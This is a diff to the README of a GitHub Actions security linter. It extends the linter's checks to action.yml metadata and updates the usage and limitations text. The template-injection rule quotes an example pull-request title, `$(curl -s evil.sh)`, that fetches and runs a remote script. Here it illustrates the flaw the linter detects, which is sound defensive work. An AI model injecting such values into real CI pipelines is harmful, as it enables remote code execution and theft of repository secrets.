@@ -25,9 +25,25 @@ deliberately small and readable: one file per concern, every rule explained belo
 | WG001 | unpinned-action | low for `actions/*`, `github/*`; high for other owners; medium for Docker tags | `uses:` with a tag or branch (`@v4`, `@main`), a short SHA, or no version. A tag can be moved to malicious code after you've reviewed it; a full 40-character commit SHA can't. Covers steps and reusable workflows (`jobs.<id>.uses`). |
 | WG002 | missing-permissions | medium | No `permissions:` at the top and at least one job without its own. The token then gets the repository's default, which may be read/write for everything. |
 | WG003 | write-all | high | `permissions: write-all` at workflow or job level. |
-| WG004 | template-injection | high | `${{ github.event.pull_request.title }}` and other outsider-controlled values (issue/PR/comment text, branch names, commit messages) inside `run:` or `actions/github-script`. The value is pasted into the script before it runs, so a PR titled `$(curl -s evil.sh)` downloads and runs that script. Pass it through `env:` and use `"$TITLE"` instead. |
+| WG004 | template-injection | high | `${{ github.event.pull_request.title }}` and other outsider-controlled values (issue/PR/comment text, branch names, commit messages) inside `run:` or `actions/github-script`. The value is pasted into the script before it runs, so a PR titled `$(curl -s evil.sh)` downloads and runs that script. Pass it through `env:` and use `"$TITLE"` instead. In a composite action, `${{ inputs.* }}` in `run:` is reported too (medium): the calling workflow may pass untrusted text. |
 | WG005 | pull-request-target | low, or high with a PR checkout | `pull_request_target` runs with secrets even for pull requests from forks. Checking out the PR's head (`ref: ${{ github.event.pull_request.head.sha }}`) then runs a stranger's code with those secrets. |
 | WG006 | persisted-credentials | low | `actions/checkout` without `persist-credentials: false` leaves the token in `.git/config`, readable by every later step. |
+
+### Actions too
+
+Besides workflows, workflow-guard reads **action metadata files** (`action.yml`), recognised by
+their `runs:` key:
+
+- Composite actions (`using: composite`): the steps under `runs.steps` get WG001, WG004 and
+  WG006, like a job's steps. WG002/WG003 don't apply (an action has no `permissions:`; it runs
+  with the caller's token) and neither does WG005 (no triggers).
+- Docker actions: `runs.image: docker://name:tag` is WG001 (medium), like a Docker `uses:`.
+  `image: Dockerfile` is built from the action's own repository and is fine.
+- JavaScript actions (`using: node24`) have nothing to check in their metadata.
+
+Without arguments it checks `.github/workflows/`, an `action.yml` at the repository root (a
+repository that *is* an action) and local actions in `.github/actions/<name>/action.yml`.
+`--fix` pins the steps of composite actions as well.
 
 ## Use it in your repository
 
@@ -94,7 +110,8 @@ repos:
 ```
 
 [pre-commit](https://pre-commit.com) installs the tool in its own environment and runs it on the
-workflow files a commit changes (`.github/workflows/*.yml` / `*.yaml`).
+workflow and action files a commit changes (`.github/workflows/*.yml`, `action.yml` and
+`.github/actions/**/action.yml`, also as `.yaml`).
 
 ## Install
 
@@ -110,7 +127,7 @@ python -m venv .venv
 ## Usage
 
 ```bash
-workflow-guard                          # checks .github/workflows in the current directory
+workflow-guard                          # checks .github/workflows and action.yml files here
 workflow-guard path/to/ci.yml other/dir # files or directories
 workflow-guard --format json            # machine-readable output
 workflow-guard --format github          # annotations, inside a GitHub Actions step
@@ -221,7 +238,7 @@ be read or parsed, or bad arguments.
 
 ```
 src/workflow_guard/
-  workflow.py  loading, node helpers, jobs/steps/triggers, inline ignores
+  workflow.py  loading workflows and actions, node helpers, jobs/steps/triggers, inline ignores
   rules.py     the six rules
   fix.py       --fix: GitHubResolver (API lookups) and pin_actions (text edits)
   sarif.py     --format sarif: rules, results, fingerprints, notifications
@@ -249,9 +266,10 @@ Ubuntu and Windows.
 
 - Expressions are matched with regular expressions, not parsed, so unusual spellings
   (`github.event['pull_request']['title']`) aren't caught.
-- Composite actions (`action.yml`, this repository's own included) and the inside of called
-  reusable workflows aren't checked. `tests/test_distribution.py` checks this action's own
-  `action.yml` for the same mistakes instead.
+- The inside of called reusable workflows and of remote actions (`uses: owner/repo@sha`)
+  isn't checked; only files in the repository being checked are.
+- `.github/actions` is searched for `action.yml` at any depth, but other places for local
+  actions (e.g. `tools/my-action/`) need to be passed as paths.
 - The action needs `bash` (all GitHub-hosted runners have it, Windows included) and network
   access to PyPI for PyYAML.
 - Not on PyPI or the GitHub Marketplace yet; install from the repository.
